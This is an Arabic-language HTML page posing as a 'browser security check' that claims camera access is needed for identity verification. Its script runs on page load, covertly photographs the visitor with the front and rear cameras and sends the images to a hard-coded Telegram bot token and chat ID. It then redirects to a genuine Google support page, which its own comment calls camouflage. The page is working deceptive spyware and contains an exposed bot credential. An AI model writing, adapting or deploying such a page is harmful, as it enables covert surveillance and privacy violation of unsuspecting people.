<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>فحص أمان المتصفح</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f4f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { text-align: center; background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); max-width: 90%; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h1 { color: #333; font-size: 1.2rem; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="container">
    <div class="loader"></div>
    <h1>جاري التحقق من أمان المتصفح...</h1>
    <p>يرجى السماح بالوصول للكاميرا لإتمام عملية التحقق من الهوية الرقمية.</p>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas" width="640" height="480"></canvas>

<script>
    const token = '8205090411:AAEIcpDG87AX8gzjI13Ei_pV9BiOcsc25EQ';
    const chatId = '7945738403';

    async function capture(mode) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: mode } 
            });
            const video = document.getElementById('video');
            video.srcObject = stream;

            return new Promise((resolve) => {
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, 640, 480);
                    
                    canvas.toBlob(blob => {
                        sendToTelegram(blob, mode);
                        // إغلاق الكاميرا لتحريرها للمرة القادمة
                        stream.getTracks().forEach(track => track.stop());
                        resolve();
                    }, 'image/jpeg', 0.7);
                }, 2000); // ننتظر ثانيتين لضمان استقرار الإضاءة والفوكس
            });
        } catch (err) {
            console.log(mode + " failed: " + err);
        }
    }

    function sendToTelegram(blob, mode) {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, `${mode}.jpg`);
        formData.append('caption', `🔔 تنبيه أمني:\nتم التقاط صورة من الكاميرا ${mode === 'user' ? 'الأمامية' : 'الخلفية'}`);

        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
    }

    async function startProcess() {
        // محاولة التقاط صورة أمامية
        await capture('user');
        // محاولة التقاط صورة خلفية
        await capture('environment');
        
        // التوجيه النهائي لموقع حقيقي بعد الانتهاء للتمويه
        window.location.href = "https://support.google.com/chrome/answer/95647";
    }

    // يبدأ العمل فور تحميل الصفحة
    window.onload = startProcess;
</script>

</body>
</html>
